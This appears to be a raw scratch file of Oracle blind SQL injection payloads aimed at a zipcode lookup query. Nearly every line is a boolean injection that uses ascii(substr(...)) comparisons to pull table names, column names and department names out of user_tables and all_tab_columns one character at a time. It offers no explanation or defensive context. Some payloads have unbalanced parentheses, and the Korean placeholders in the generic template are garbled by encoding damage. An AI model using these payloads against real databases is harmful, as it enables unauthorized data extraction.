
â��%'  and (select ascii(substr((select department_name from (select rownum as rnum,department_name from departments) where rnum=3),1,1)) from dual)< 77  --









select * from zipcode where dong like '%â��%'  and (select ascii(substr((select table_name from (select rownum as rnum,table_name from user_tables) where rnum=2),1,1)) from dual)>1  --;

â��%'  and (select ascii(substr((select table_name from (select rownum as rnum,table_name from user_tables) where rnum=2),1,1)) from dual)> 77  --

â��%'  and (select ascii(substr((select table_name from (select rownum as rnum,table_name from user_tables) where rnum=3),1,1)) from dual)< 77  --


â��%'  and (select ascii(substr((select column_name from (select rownum as rnum,column_name from all_tab_columns where table_name='DEPARTMENTS') where rnum=3),1,1)) from dual)< 77  --




â��%'  and (select ascii(substr((select column_name from (select rownum as rnum,column_name from all_tab_columns where table_name='departments') where rnum=3),1,1)) from dual)< 77  --





And select ascii(substr((select [Į����] from (select rownum as rnum,[Į����] from [���̺���]) where rnum=[�ε���]),[���ڿ��� ��ġ],1)) > [�� ����]




select * from zipcode where dong like '%â��%' and (select ascii((select table_name from (select rownum as rnum,table_name from user_tables) where rnum=2),1,1) from dual)) from dual) > 77 --);




(select ascii((select substr((select table_name from (select rownum as rnum,table_name from user_tables) where rnum=2),1,1) from dual)) from dual >70);  



1' and (select ascii(substr((select table_name from (select rownum as rnum,table_name from user_tables) where rnum=3),1,1)) from dual);


(select ascii(substr((select table_name from (select rownum as rnum,table_name from user_tables) where rnum=1),1,1)) from dual);




and (select ascii((select table_name from (select rownum as rnum,table_name from user_tables) where rnum=2),1,1) from dual)) from dual) > 77 --



